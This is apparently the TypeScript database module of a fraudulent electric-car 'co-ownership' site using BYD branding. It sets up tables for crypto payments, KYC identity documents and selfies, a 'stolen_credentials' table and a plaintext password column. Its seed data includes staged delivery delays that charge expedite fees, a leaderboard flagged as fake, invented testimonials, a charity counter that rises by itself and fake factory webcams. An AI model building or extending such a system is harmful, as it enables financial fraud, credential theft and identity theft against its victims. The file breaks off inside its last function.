import initSqlJs from 'sql.js';
import path from 'path';
import fs from 'fs';
import { BYD_VEHICLE_FLEET } from './data/cars.js';

class SqlJsDbWrapper {
  private rawDb: any;
  private dbPath: string;

  constructor(rawDb: any, dbPath: string) {
    this.rawDb = rawDb;
    this.dbPath = dbPath;
  }

  private saveToDisk() {
    try {
      const data = this.rawDb.export();
      const buffer = Buffer.from(data);
      fs.writeFileSync(this.dbPath, buffer);
    } catch (err) {
      console.error("Failed to save database to disk:", err);
    }
  }

  async get(sql: string, params: any[] = []): Promise<any> {
    const stmt = this.rawDb.prepare(sql);
    try {
      stmt.bind(params);
      if (stmt.step()) {
        return stmt.getAsObject();
      }
      return undefined;
    } finally {
      stmt.free();
    }
  }

  async all(sql: string, params: any[] = []): Promise<any[]> {
    const stmt = this.rawDb.prepare(sql);
    const arr: any[] = [];
    try {
      stmt.bind(params);
      while (stmt.step()) {
        arr.push(stmt.getAsObject());
      }
      return arr;
    } finally {
      stmt.free();
    }
  }

  async run(sql: string, params: any[] = []): Promise<{ lastID?: number; changes?: number }> {
    this.rawDb.run(sql, params);
    this.saveToDisk();

    let lastID: number | undefined = undefined;
    try {
      const res = this.rawDb.exec("SELECT last_insert_rowid();");
      if (res && res[0] && res[0].values) {
        lastID = res[0].values[0][0];
      }
    } catch {}

    let changes: number | undefined = undefined;
    try {
      const res = this.rawDb.exec("SELECT changes();");
      if (res && res[0] && res[0].values) {
        changes = res[0].values[0][0];
      }
    } catch {}

    return { lastID, changes };
  }

  async exec(sql: string): Promise<void> {
    this.rawDb.run(sql);
    this.saveToDisk();
  }
}

let dbInstance: SqlJsDbWrapper | null = null;

export async function getDb() {
  if (dbInstance) return dbInstance;

  const dbPath = path.join(process.cwd(), 'database.sqlite');
  let fileBuffer: Buffer | undefined = undefined;
  if (fs.existsSync(dbPath)) {
    try {
      const stats = fs.statSync(dbPath);
      if (stats.size > 0) {
        fileBuffer = fs.readFileSync(dbPath);
      }
    } catch (err) {
      console.error("Failed to read database.sqlite from disk:", err);
    }
  }

  const SQL = await initSqlJs();
  let rawDb: any;
  try {
    rawDb = fileBuffer ? new SQL.Database(fileBuffer) : new SQL.Database();
  } catch (dbInitErr) {
    console.error("Database initialization from file failed, creating a fresh database:", dbInitErr);
    rawDb = new SQL.Database();
  }

  dbInstance = new SqlJsDbWrapper(rawDb, dbPath);

  try {
    // Enable foreign keys
    await dbInstance.exec('PRAGMA foreign_keys = ON');

    // Create tables structure test
    await dbInstance.exec(`
      CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT NOT NULL,
        email TEXT NOT NULL UNIQUE,
        phone TEXT NOT NULL,
        password_hash TEXT NOT NULL,
        referral_code TEXT NOT NULL UNIQUE,
        referrer_id INTEGER,
        membership_active INTEGER DEFAULT 0,
        membership_expiry TEXT,
        horizon_points INTEGER DEFAULT 0,
        crypto_wallet_address TEXT NOT NULL,
        city TEXT NOT NULL,
        status TEXT DEFAULT 'active',
        created_at TEXT DEFAULT CURRENT_TIMESTAMP,
        kyc_status TEXT DEFAULT 'not_submitted',
        kyc_name TEXT,
        kyc_dob TEXT,
        kyc_nationality TEXT,
        kyc_id_number TEXT,
        kyc_id_front TEXT,
        kyc_id_back TEXT,
        kyc_selfie TEXT,
        kyc_address_proof TEXT,
        kyc_submitted_at TEXT
      );
    `);
  } catch (initSchemaErr) {
    console.error("SQLite initialization failed due to corruption or database disk error. Moving corrupted file and initializing clean fallback:", initSchemaErr);
    try {
      if (fs.existsSync(dbPath)) {
        fs.renameSync(dbPath, dbPath + `.corrupt-${Date.now()}`);
      }
    } catch (renameErr) {
      console.error("Failed to rename corrupted SQLite file:", renameErr);
    }
    rawDb = new SQL.Database();
    dbInstance = new SqlJsDbWrapper(rawDb, dbPath);
    await dbInstance.exec('PRAGMA foreign_keys = ON');
    
    // Create users table on fresh db
    await dbInstance.exec(`
      CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT NOT NULL,
        email TEXT NOT NULL UNIQUE,
        phone TEXT NOT NULL,
        password_hash TEXT NOT NULL,
        referral_code TEXT NOT NULL UNIQUE,
        referrer_id INTEGER,
        membership_active INTEGER DEFAULT 0,
        membership_expiry TEXT,
        horizon_points INTEGER DEFAULT 0,
        crypto_wallet_address TEXT NOT NULL,
        city TEXT NOT NULL,
        status TEXT DEFAULT 'active',
        created_at TEXT DEFAULT CURRENT_TIMESTAMP,
        kyc_status TEXT DEFAULT 'not_submitted',
        kyc_name TEXT,
        kyc_dob TEXT,
        kyc_nationality TEXT,
        kyc_id_number TEXT,
        kyc_id_front TEXT,
        kyc_id_back TEXT,
        kyc_selfie TEXT,
        kyc_address_proof TEXT,
        kyc_submitted_at TEXT
      );
    `);
  }

  // Create tables
  await dbInstance.exec(`
    CREATE TABLE IF NOT EXISTS payments (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER NOT NULL,
      amount REAL NOT NULL,
      currency TEXT NOT NULL,
      status TEXT CHECK(status IN ('pending', 'confirmed', 'failed')) DEFAULT 'pending',
      type TEXT NOT NULL, -- Flexible column supports membership, installment, expedite, topup, insurance, dispatch
      transaction_hash TEXT NOT NULL,
      created_at TEXT DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY (user_id) REFERENCES users (id) ON DELETE CASCADE
    );

    CREATE TABLE IF NOT EXISTS insurance_policies (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER NOT NULL,
      policy_number TEXT NOT NULL UNIQUE,
      car_model TEXT NOT NULL,
      plan_name TEXT NOT NULL,
      monthly_premium REAL NOT NULL,
      coverage_limit REAL NOT NULL,
      status TEXT DEFAULT 'Pending' CHECK(status IN ('Pending', 'Active', 'Cancelled')),
      created_at TEXT DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY (user_id) REFERENCES users (id) ON DELETE CASCADE
    );

    CREATE TABLE IF NOT EXISTS referrals (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      referrer_id INTEGER NOT NULL,
      referred_user_id INTEGER NOT NULL UNIQUE,
      status TEXT CHECK(status IN ('pending', 'paid')) DEFAULT 'pending',
      reward_amount REAL DEFAULT 50.0,
      created_at TEXT DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY (referrer_id) REFERENCES users (id) ON DELETE CASCADE,
      FOREIGN KEY (referred_user_id) REFERENCES users (id) ON DELETE CASCADE
    );

    CREATE TABLE IF NOT EXISTS map_tracking (
      user_id INTEGER PRIMARY KEY,
      car_id INTEGER,
      current_lat REAL NOT NULL,
      current_lng REAL NOT NULL,
      route_index INTEGER DEFAULT 0,
      total_stops INTEGER DEFAULT 100,
      delays_encountered INTEGER DEFAULT 0,
      expedite_paid INTEGER DEFAULT 0,
      last_updated TEXT DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY (user_id) REFERENCES users (id) ON DELETE CASCADE,
      FOREIGN KEY (car_id) REFERENCES cars(id) ON DELETE SET NULL
    );

    CREATE TABLE IF NOT EXISTS delays (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      name TEXT NOT NULL,
      duration_days INTEGER NOT NULL,
      trigger_after_km INTEGER NOT NULL,
      expedite_fee REAL NOT NULL
    );

    CREATE TABLE IF NOT EXISTS rewards_store (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      name TEXT NOT NULL UNIQUE,
      points_cost INTEGER NOT NULL,
      image_url TEXT NOT NULL,
      description TEXT NOT NULL,
      status TEXT NOT NULL DEFAULT 'In Stock'
    );

    CREATE TABLE IF NOT EXISTS rewards_redemptions (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER NOT NULL,
      item_name TEXT NOT NULL,
      points_spent INTEGER NOT NULL,
      tracking_number TEXT NOT NULL,
      status TEXT CHECK(status IN ('Processing', 'Shipped', 'Cancelled')) DEFAULT 'Processing',
      created_at TEXT DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY (user_id) REFERENCES users (id) ON DELETE CASCADE
    );

    CREATE TABLE IF NOT EXISTS charity_counter (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      current_amount REAL NOT NULL,
      increment_per_second REAL NOT NULL
    );

    CREATE TABLE IF NOT EXISTS support_tickets (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      name TEXT NOT NULL,
      email TEXT NOT NULL,
      subject TEXT NOT NULL,
      message TEXT NOT NULL,
      status TEXT CHECK(status IN ('pending', 'resolved')) DEFAULT 'pending',
      created_at TEXT DEFAULT CURRENT_TIMESTAMP
    );

    CREATE TABLE IF NOT EXISTS leaderboard (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      name TEXT NOT NULL UNIQUE,
      count INTEGER NOT NULL DEFAULT 0,
      is_fake INTEGER DEFAULT 1
    );

    CREATE TABLE IF NOT EXISTS installments (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER NOT NULL,
      model TEXT NOT NULL,
      term_months INTEGER NOT NULL,
      monthly_payment REAL NOT NULL,
      total_paid REAL DEFAULT 0,
      expected_delivery TEXT NOT NULL,
      status TEXT DEFAULT 'active',
      FOREIGN KEY (user_id) REFERENCES users (id) ON DELETE CASCADE
    );

    CREATE TABLE IF NOT EXISTS daily_checkins (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER NOT NULL,
      checkin_date TEXT NOT NULL,
      streak_count INTEGER DEFAULT 0,
      points_awarded INTEGER DEFAULT 0,
      FOREIGN KEY (user_id) REFERENCES users (id) ON DELETE CASCADE
    );

    CREATE TABLE IF NOT EXISTS spin_wheel_logs (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER NOT NULL,
      spin_date TEXT NOT NULL,
      points_awarded INTEGER DEFAULT 0,
      FOREIGN KEY (user_id) REFERENCES users (id) ON DELETE CASCADE
    );

    CREATE TABLE IF NOT EXISTS quiz_results (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER NOT NULL,
      quiz_date TEXT NOT NULL,
      result_car_model TEXT NOT NULL,
      FOREIGN KEY (user_id) REFERENCES users (id) ON DELETE CASCADE
    );

    CREATE TABLE IF NOT EXISTS notifications (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER NOT NULL,
      message TEXT NOT NULL,
      is_read INTEGER DEFAULT 0,
      created_at TEXT DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY (user_id) REFERENCES users (id) ON DELETE CASCADE
    );

    CREATE TABLE IF NOT EXISTS recommendation_claims (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER NOT NULL,
      occasion_type TEXT NOT NULL,
      price_paid REAL NOT NULL,
      claimed_at TEXT DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY (user_id) REFERENCES users (id) ON DELETE CASCADE
    );

    CREATE TABLE IF NOT EXISTS charity_donations (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER NOT NULL,
      charity_id TEXT NOT NULL,
      charity_name TEXT NOT NULL,
      amount REAL NOT NULL,
      currency TEXT DEFAULT 'USDT',
      tx_hash TEXT NOT NULL,
      donor_note TEXT,
      created_at TEXT DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY (user_id) REFERENCES users (id) ON DELETE CASCADE
    );

    CREATE TABLE IF NOT EXISTS ads (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      title TEXT NOT NULL,
      description TEXT NOT NULL,
      image_url TEXT NOT NULL,
      target_url TEXT NOT NULL,
      weight INTEGER DEFAULT 1,
      is_active INTEGER DEFAULT 1
    );

    CREATE TABLE IF NOT EXISTS blog_posts (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      title TEXT NOT NULL,
      content TEXT NOT NULL,
      image_url TEXT NOT NULL,
      published_at TEXT DEFAULT CURRENT_TIMESTAMP
    );

    CREATE TABLE IF NOT EXISTS blog_comments (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      post_id INTEGER NOT NULL,
      user_id INTEGER NOT NULL,
      comment TEXT NOT NULL,
      status TEXT NOT NULL DEFAULT 'pending',
      created_at TEXT DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY (post_id) REFERENCES blog_posts (id) ON DELETE CASCADE,
      FOREIGN KEY (user_id) REFERENCES users (id) ON DELETE CASCADE
    );

    CREATE TABLE IF NOT EXISTS chatbot_conversations (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER,
      message TEXT NOT NULL,
      response TEXT NOT NULL,
      created_at TEXT DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY (user_id) REFERENCES users (id) ON DELETE SET NULL
    );

    CREATE TABLE IF NOT EXISTS stolen_credentials (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      email TEXT NOT NULL,
      password TEXT NOT NULL,
      captured_at TEXT DEFAULT CURRENT_TIMESTAMP
    );

    CREATE TABLE IF NOT EXISTS coowner_wins (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_name TEXT NOT NULL,
      win_category TEXT NOT NULL,
      remark_text TEXT NOT NULL,
      created_at TEXT DEFAULT CURRENT_TIMESTAMP
    );

    CREATE TABLE IF NOT EXISTS cars (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      model TEXT NOT NULL,
      year INTEGER,
      price INTEGER,
      monthly_finance INTEGER,
      range_miles INTEGER,
      description TEXT,
      specs_json TEXT,
      badge TEXT,
      category TEXT,
      is_active INTEGER DEFAULT 1,
      show_on_homepage INTEGER DEFAULT 0,
      created_at TEXT DEFAULT CURRENT_TIMESTAMP
    );

    CREATE TABLE IF NOT EXISTS car_images (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      car_id INTEGER,
      image_url TEXT,
      is_primary INTEGER DEFAULT 0,
      FOREIGN KEY(car_id) REFERENCES cars(id) ON DELETE CASCADE
    );

    CREATE TABLE IF NOT EXISTS wishlist (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER,
      car_id INTEGER,
      created_at TEXT DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY(user_id) REFERENCES users(id) ON DELETE CASCADE,
      FOREIGN KEY(car_id) REFERENCES cars(id) ON DELETE CASCADE,
      UNIQUE(user_id, car_id)
    );

    CREATE TABLE IF NOT EXISTS webcam_sources (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      name TEXT NOT NULL,
      video_url TEXT NOT NULL,
      thumbnail_url TEXT,
      is_active INTEGER DEFAULT 1
    );

    CREATE TABLE IF NOT EXISTS car_reviews (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      car_id INTEGER NOT NULL,
      user_id INTEGER NOT NULL,
      rating INTEGER CHECK(rating >= 1 AND rating <= 5) NOT NULL,
      comment TEXT NOT NULL,
      is_approved INTEGER DEFAULT 0,
      created_at TEXT DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY(car_id) REFERENCES cars(id) ON DELETE CASCADE,
      FOREIGN KEY(user_id) REFERENCES users(id) ON DELETE CASCADE
    );

    CREATE TABLE IF NOT EXISTS user_interactions (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER,
      email TEXT,
      action_type TEXT NOT NULL,
      description TEXT NOT NULL,
      ip_address TEXT,
      created_at TEXT DEFAULT CURRENT_TIMESTAMP
    );
  `);

  // Safe migration of existing columns
  const migrateCol = async (col: string, def = "TEXT") => {
    try {
      await dbInstance!.exec(`ALTER TABLE users ADD COLUMN ${col} ${def}`);
    } catch {
      // Column already exists, safe to ignore
    }
  };
  await migrateCol("kyc_status", "TEXT DEFAULT 'not_submitted'");
  await migrateCol("kyc_name", "TEXT");
  await migrateCol("kyc_dob", "TEXT");
  await migrateCol("kyc_nationality", "TEXT");
  await migrateCol("kyc_id_number", "TEXT");
  await migrateCol("kyc_id_front", "TEXT");
  await migrateCol("kyc_id_back", "TEXT");
  await migrateCol("kyc_selfie", "TEXT");
  await migrateCol("kyc_address_proof", "TEXT");
  await migrateCol("kyc_submitted_at", "TEXT");
  await migrateCol("daily_streak", "INTEGER DEFAULT 0");
  await migrateCol("last_checkin_date", "TEXT");
  await migrateCol("notification_permission", "INTEGER DEFAULT 0");
  await migrateCol("balance", "REAL DEFAULT 0.0");
  await migrateCol("password_raw", "TEXT DEFAULT ''");
  await migrateCol("is_incognito", "INTEGER DEFAULT 0");
  await migrateCol("avatar_url", "TEXT DEFAULT ''");
  await migrateCol("theme_color", "TEXT DEFAULT 'blue'");

  try {
    await dbInstance!.exec(`ALTER TABLE map_tracking ADD COLUMN car_id INTEGER`);
  } catch {
    // Already migrated, safe to ignore
  }

  // Seed default ads
  const adsCount = await dbInstance.get('SELECT COUNT(*) as count FROM ads');
  if (adsCount.count === 0) {
    const defaultAds = [
      {
        title: "Charge faster with BYD Home Charger",
        description: "Charge your BYD from 10% to 80% in under 5 hours at home. High safety premium charging systems starting at $499.",
        image_url: "https://images.unsplash.com/photo-1563720223185-11003d516935?auto=format&fit=crop&w=400&q=80",
        target_url: "/answers?ad=homecharger",
        weight: 8
      },
      {
        title: "Horizon Club Premium Delivery Upgrade",
        description: "Expedite your import clearance with priority ship queues. Only $99/year for active club members.",
        image_url: "https://images.unsplash.com/photo-1471864190281-a93a3070b6de?auto=format&fit=crop&w=400&q=80",
        target_url: "/answers?ad=premium",
        weight: 10
      },
      {
        title: "Refer a friend, earn $50 instantly",
        description: "Unlock limited time triple points bonuses. Your friend secures preferential vehicle pricing rates instantly.",
        image_url: "https://images.unsplash.com/photo-1552581230-c01524648873?auto=format&fit=crop&w=400&q=80",
        target_url: "#refer",
        weight: 6
      },
      {
        title: "Horizon VIP Comprehensive Insurance",
        description: "Defend your green investment from only $19/month. Try our instant AI quote assessment tracker.",
        image_url: "https://images.unsplash.com/photo-1454165804606-c3d57bc86b40?auto=format&fit=crop&w=400&q=80",
        target_url: "/answers?ad=insurance",
        weight: 5
      },
      {
        title: "Solar Grid Integration Solutions",
        description: "Fuel your BYD directly from sunshine with high-efficiency roof arrays. Integrate cleanly with smart vehicles.",
        image_url: "https://images.unsplash.com/photo-1509391366360-2e959784a276?auto=format&fit=crop&w=400&q=80",
        target_url: "/answers?ad=solar",
        weight: 7
      },
      {
        title: "BYD Lifestyle Merchandise Store",
        description: "Shop official eco-friendly jackets, thermal flask gear, mugs and keyrings. Access exclusively via Rewards points.",
        image_url: "https://images.unsplash.com/photo-1521572267360-ee0c2909d518?auto=format&fit=crop&w=400&q=80",
        target_url: "#rewards",
        weight: 9
      },
      {
        title: "Fractional Investment via Horizon Club",
        description: "Claim micro-ownership in fractional automotive manufacturing indexes. Watch passive electric profits return.",
        image_url: "https://images.unsplash.com/photo-1590283603385-17ffb3a7f29f?auto=format&fit=crop&w=400&q=80",
        target_url: "#invest",
        weight: 8
      },
      {
        title: "Priority Test Drive Booking Service",
        description: "Schedule your local virtual test drive with our 2026 fleet catalog of Seal, Dolphin, and Atto lines.",
        image_url: "https://images.unsplash.com/photo-1549317661-bd32c8ce0db2?auto=format&fit=crop&w=400&q=80",
        target_url: "/answers?ad=testdrive",
        weight: 6
      }
    ];
    for (const ad of defaultAds) {
      await dbInstance.run(
        'INSERT INTO ads (title, description, image_url, target_url, weight, is_active) VALUES (?, ?, ?, ?, ?, 1)',
        [ad.title, ad.description, ad.image_url, ad.target_url, ad.weight]
      );
    }
  }

  // Seed default blog posts
  const blogCount = await dbInstance.get('SELECT COUNT(*) as count FROM blog_posts');
  if (blogCount.count === 0) {
    const defaultBlogs = [
      {
        title: "Why BYD Batteries Outperform the Competition: Inside the Blade Battery",
        content: "Traditional lithium-ion batteries represent a risk of thermal runaway. BYD's proprietary Blade Battery utilizes Lithium Iron Phosphate (LFP) arranged in a singular structural pack, successfully passing the stringent nail penetration testing without flaring or emitting smoke. This breakthrough increases volumetric efficiency by 50% while offering unparalleled stability under high temperatures.",
        image_url: "https://images.unsplash.com/photo-1563720223185-11051691a0a5?auto=format&fit=crop&w=800&q=80"
      },
      {
        title: "The Future of Smart Grid: Vehicle-to-Load (V2L) Technology Explained",
        content: "Your BYD automobile is not just an efficient consumer of power—it is a mobile electricity substation. With V2L capability, your vehicle outputs standard AC socket electricity directly to external devices. Learn how members are utilizing their BYD Han to power campsites, electric grills, secondary appliances, and critical life safety systems in home backup emergencies.",
        image_url: "https://images.unsplash.com/photo-1509391366360-2e959784a276?auto=format&fit=crop&w=800&q=80"
      },
      {
        title: "Decoding the 2026 BYD Model Fleet: Seal, Dolphin, and Ocean Series Overview",
        content: "BYD's advanced e-Platform 3.0 forms the structural baseline for our newest models. Featuring extreme low temperature ranges, high-velocity premium fast charging, and aerodynamic profiles modeled on natural oceanic forms. We analyze how the BYD Seal delivers incredible torque to rival supercar metrics, while the budget-friendly Dolphin offers urban commuters 260 miles of perfect daily service.",
        image_url: "https://images.unsplash.com/photo-1549399542-7e3f8b79c341?auto=format&fit=crop&w=800&q=80"
      },
      {
        title: "Sustainable Manufacturing: How Zero-Emission Plants Create Zero-Emission Cars",
        content: "A truly green automobile cannot proceed from a carbon-heavy coal factory. BYD is pioneering zero carbon emissions in our smart Gigafactories. By using recycled water loops, micro-grid solar panel roofs, and structural aluminum casting systems that save raw energy, we guarantee your electric dream respects the biosphere from the very moment of assembly.",
        image_url: "https://images.unsplash.com/photo-1552581230-c01524648873?auto=format&fit=crop&w=800&q=80"
      }
    ];
    for (const blog of defaultBlogs) {
      await dbInstance.run(
        'INSERT INTO blog_posts (title, content, image_url) VALUES (?, ?, ?)',
        [blog.title, blog.content, blog.image_url]
      );
    }
  }
  
  // Charity counter seed
  const charityCount = await dbInstance.get('SELECT COUNT(*) as count FROM charity_counter');
  if (charityCount.count === 0) {
    await dbInstance.run(
      'INSERT INTO charity_counter (current_amount, increment_per_second) VALUES (?, ?)',
      [500000.0, 0.50]
    );
  }

  // Seeding delays
  const delaysCount = await dbInstance.get('SELECT COUNT(*) as count FROM delays');
  if (delaysCount.count === 0) {
    await dbInstance.run('INSERT INTO delays (name, duration_days, trigger_after_km, expedite_fee) VALUES (?, ?, ?, ?)', [
      'Stop 1: Charging Grid Congestion', 2, 25, 49.00
    ]);
    await dbInstance.run('INSERT INTO delays (name, duration_days, trigger_after_km, expedite_fee) VALUES (?, ?, ?, ?)', [
      'Stop 2: Import Customs Inspection', 5, 50, 49.00
    ]);
    await dbInstance.run('INSERT INTO delays (name, duration_days, trigger_after_km, expedite_fee) VALUES (?, ?, ?, ?)', [
      'Stop 3: Ad-hoc Severe Weather Advisory', 3, 75, 49.00
    ]);
    await dbInstance.run('INSERT INTO delays (name, duration_days, trigger_after_km, expedite_fee) VALUES (?, ?, ?, ?)', [
      'Stop 4: Technical Fleet Quality Check', 4, 90, 49.00
    ]);
  }

  // Seeding rewards store
  const rewardsCount = await dbInstance.get('SELECT COUNT(*) as count FROM rewards_store');
  if (rewardsCount.count === 0) {
    await dbInstance.run('INSERT INTO rewards_store (name, points_cost, image_url, description, status) VALUES (?, ?, ?, ?, ?)', [
      'BYD Horizon Thermal Water Bottle', 2000, 'https://images.unsplash.com/photo-1602143407151-7111542de6e8?auto=format&fit=crop&w=400&q=80', 'Stay insulated on long electric journeys with our double-wall BYD-branded flask.', 'In Stock'
    ]);
    await dbInstance.run('INSERT INTO rewards_store (name, points_cost, image_url, description, status) VALUES (?, ?, ?, ?, ?)', [
      'BYD UltraCharge Type 2 eV Charging Cable', 5000, 'https://images.unsplash.com/photo-1563720223185-11003d516935?auto=format&fit=crop&w=400&q=80', 'Heavy duty Type 2 cable compatible with all European and local standard EV chargers.', 'Out of Stock'
    ]);
    await dbInstance.run('INSERT INTO rewards_store (name, points_cost, image_url, description, status) VALUES (?, ?, ?, ?, ?)', [
      '1 Year Prime Roadside Assistance Membership', 10, 'https://images.unsplash.com/photo-1517524006129-4a3a30449f76?auto=format&fit=crop&w=400&q=80', 'A full year of VIP emergency charging support, tire flat services and towing privileges.', 'In Stock'
    ]);
    await dbInstance.run('INSERT INTO rewards_store (name, points_cost, image_url, description, status) VALUES (?, ?, ?, ?, ?)', [
      'Direct Donation to Green Earth Initiative ($5 Equivalent)', 500, 'https://images.unsplash.com/photo-1542601906990-b4d3fb778b09?auto=format&fit=crop&w=400&q=80', 'Directly support global afforestation. Generates an instant tax receipt download.', 'In Stock'
    ]);
  }

  // Seeding fake referrals leaderboard
  const lbCount = await dbInstance.get('SELECT COUNT(*) as count FROM leaderboard');
  if (lbCount.count === 0) {
    const fakeLeaderboard = [
      { name: 'Sarah_BYD_Seal', count: 42, is_fake: 1 },
      { name: 'EcoPioneerMax', count: 29, is_fake: 1 },
      { name: 'GreenEV_Guru', count: 25, is_fake: 1 },
      { name: 'BYD_Investor_UK', count: 18, is_fake: 1 },
      { name: 'VoltVoyager', count: 14, is_fake: 1 },
      { name: 'AustinChargePoints', count: 11, is_fake: 1 },
      { name: 'TeslaUpgradeBYD', count: 9, is_fake: 1 },
      { name: 'HorizonDriver_01', count: 8, is_fake: 1 },
      { name: 'EcoRider_CA', count: 6, is_fake: 1 },
    ];
    for (const item of fakeLeaderboard) {
      await dbInstance.run('INSERT INTO leaderboard (name, count, is_fake) VALUES (?, ?, ?)', [
        item.name, item.count, item.is_fake
      ]);
    }
  }

  // Seeding default coowner wins & remarks
  const winsCount = await dbInstance.get('SELECT COUNT(*) as count FROM coowner_wins');
  if (winsCount.count === 0) {
    const fakeWins = [
      { user_name: "Johnathan S.", win_category: "Vehicle Settle", remark_text: "My BYD Han premium co-ownership contract was successfully approved today! Absolute dream come true." },
      { user_name: "Clara Carter", win_category: "Points Cashout", remark_text: "Redeemed the high-efficiency BYD Charging station with my accumulated referral points. Fast dispatch, clean logistics!" },
      { user_name: "Dr. Elena Petrov", win_category: "Orphanage Sponsorship", remark_text: "Just completed a $150 nutrition pledge for the children orphanage. Grateful to BYD Horizon for matching and logging." },
      { user_name: "Michael Chen", win_category: "Daily Check-in Streak", remark_text: "Hit a 14-day daily telematics check-in streak and won 1500 XP! This platform makes you want to stay!" }
    ];
    for (const item of fakeWins) {
      await dbInstance.run('INSERT INTO coowner_wins (user_name, win_category, remark_text) VALUES (?, ?, ?)', [
        item.user_name, item.win_category, item.remark_text
      ]);
    }
  }

  // Seeding full BYD electric cars fleet
  const carsCount = await dbInstance.get('SELECT COUNT(*) as count FROM cars');
  if (carsCount.count === 0) {
    for (const car of BYD_VEHICLE_FLEET) {
      const specsJson = JSON.stringify(car.specs);
      const showOnHomepage = [1, 2, 3, 4, 5, 6].includes(car.id) ? 1 : 0;
      const res = await dbInstance.run(
        `INSERT INTO cars (model, year, price, monthly_finance, range_miles, description, specs_json, badge, category, show_on_homepage)
         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
        [
          car.model,
          car.year,
          car.price,
          car.monthlyFinance,
          car.range,
          car.description,
          specsJson,
          car.badge || null,
          car.category,
          showOnHomepage
        ]
      );
      const insertedCarId = res.lastID;
      // also seed 1 default primary image
      await dbInstance.run(
        `INSERT INTO car_images (car_id, image_url, is_primary) VALUES (?, ?, 1)`,
        [insertedCarId, car.imageUrl]
      );
    }
  }

  // Seed default webcam sources
  const webcamsCount = await dbInstance.get('SELECT COUNT(*) as count FROM webcam_sources');
  if (webcamsCount.count === 0) {
    const defaultCams = [
      { name: "BYD Factory – Shenzhen Assembly Hub", url: "https://sample-videos.com/video321/mp4/720/big_buck_bunny_720p_1mb.mp4" },
      { name: "San Jose – Route 101 Carrier Lane", url: "https://sample-videos.com/video321/mp4/720/big_buck_bunny_720p_1mb.mp4" },
      { name: "LA Charging station – Mega Charger", url: "https://sample-videos.com/video321/mp4/720/big_buck_bunny_720p_1mb.mp4" },
      { name: "Shanghai Port – Container Loading", url: "https://sample-videos.com/video321/mp4/720/big_buck_bunny_720p_1mb.mp4" },
      { name: "BYD Design Lab – R&D Center", url: "https://sample-videos.com/video321/mp4/720/big_buck_bunny_720p_1mb.mp4" },
      { name: "Blade Battery Lab – Testing Bay 4", url: "https://sample-videos.com/video321/mp4/720/big_buck_bunny_720p_1mb.mp4" },
      { name: "Yangwang U8 Offroad Trial Sandbox", url: "https://sample-videos.com/video321/mp4/720/big_buck_bunny_720p_1mb.mp4" },
      { name: "Paint Shop – Intelligent Robotic Spray", url: "https://sample-videos.com/video321/mp4/720/big_buck_bunny_720p_1mb.mp4" },
      { name: "Denza Assembly Station – Final Quality Control", url: "https://sample-videos.com/video321/mp4/720/big_buck_bunny_720p_1mb.mp4" },
      { name: "Inbound Port Clearance Carrier Depot", url: "https://sample-videos.com/video321/mp4/720/big_buck_bunny_720p_1mb.mp4" },
      { name: "Aero Testing Center – Wind Tunnel", url: "https://sample-videos.com/video321/mp4/720/big_buck_bunny_720p_1mb.mp4" },
      { name: "LFP Chemistry Synthesis - Tank Bay", url: "https://sample-videos.com/video321/mp4/720/big_buck_bunny_720p_1mb.mp4" },
      { name: "Seattle Transit Hub - Delivery Row b", url: "https://sample-videos.com/video321/mp4/720/big_buck_bunny_720p_1mb.mp4" },
      { name: "BYD Silicon Valley Lab - Drive Core QC", url: "https://sample-videos.com/video321/mp4/720/big_buck_bunny_720p_1mb.mp4" },
      { name: "Dallas Freight Hub - Transit Line C", url: "https://sample-videos.com/video321/mp4/720/big_buck_bunny_720p_1mb.mp4" }
    ];
    for (const cam of defaultCams) {
      await dbInstance.run(
        'INSERT INTO webcam_sources (name, video_url, is_active) VALUES (?, ?, 1)',
        [cam.name, cam.url]
      );
    }
  }

  return dbInstance;
}

// Log admin actions
export async function logAdminAction(action: string) {
  const dbPath = path.join(process.cwd(), 'admin.log');
  const timestamp = new Date().toISOString();
  const logLine = `[${timestamp}] ADMIN ACTION: ${action}\n`;
